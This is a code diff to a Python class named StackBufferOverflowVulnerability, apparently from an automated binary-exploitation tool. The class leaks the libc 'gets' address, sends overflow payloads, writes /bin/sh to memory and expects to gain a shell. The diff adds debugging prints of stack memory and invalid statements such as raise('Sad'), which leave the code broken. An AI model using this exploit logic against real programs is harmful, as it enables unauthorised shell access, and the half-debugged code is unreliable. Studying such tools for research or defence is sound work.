@@ -137,6 +137,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         sconn = conn.conn
         function_addr = int(self.function["address"], 16) 
         target_func = int(self.targetFunc["address"], 16)
+        func_exit = int(self.functionExit, 16)
         
         prefix = b"A"*abs(self.stackOffset)
 
@@ -153,17 +154,23 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # Navigate to targetFunc
         if self.initial:
             logger.info("Using provided intial value to clear stdout")
-            sconn.recvuntil(self.initial)
+            res = sconn.recvuntil(self.initial)
+            logger.debug(f"Initial: {res}")
         else:
             logger.info("Navigating to invocation of target input function.")
             conn.navigate(target_func)
 
-        res = sconn.recv()
-        logger.debug(f"Initial: {res}")
 
         # read libc location
         logger.info("Sending first payload (to leak 'gets' location)")
-        sconn.sendline(payload1)
+        rsp =conn.model.state.regs.rsp           
+        for i in range(8):
+                return_addr = conn.model.state.memory.load(rsp+8*i, 8)
+                #print(conn.model.state.callstack)
+                print(return_addr)
+        print(conn.model.state.callstack)
+        print(return_addr)
+        
         conn.model.sendline(payload1)
 
         # Need to perform drain of non libc stuff
@@ -173,7 +180,19 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(self.functionExit)
+            conn.navigate(func_exit)
+            conn.model.simgr.step()
+            print(conn.model.simgr.active)
+            rsp =conn.model.state.regs.rsp
+            print(conn.model.state.posix.dumps(0))
+            for i in range(12):
+                return_addr = conn.model.state.memory.load(rsp-64+8*i, 8)
+                #print(conn.model.state.callstack)
+                print(return_addr)
+            raise("Sad")
+        
+        # Alright! We've navigated to the function exit!
+        # Unfortunately, we're now in a pickle.
 
         # We've hit the return, next output is now the 'gets' address
         gets_location = sconn.recvline()[:-1]
@@ -202,6 +221,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         logger.info("Sending second payload (setup write to controlled memory)")
         sconn.sendline(payload2)
         conn.model.sendline(payload2) # update model
+        raise("this may have not worked")
         logger.info("Navigating to return.")
         if self.suffix:
             logger.info(f"Attempting to receive provided suffix: {suffix}")
@@ -209,7 +229,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(self.functionExit)
+            conn.navigate(func_exit)
 
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
@@ -246,6 +266,6 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(self.functionExit)
+            conn.navigate(func_exit)
         
         logger.info("We should now have a shell.")
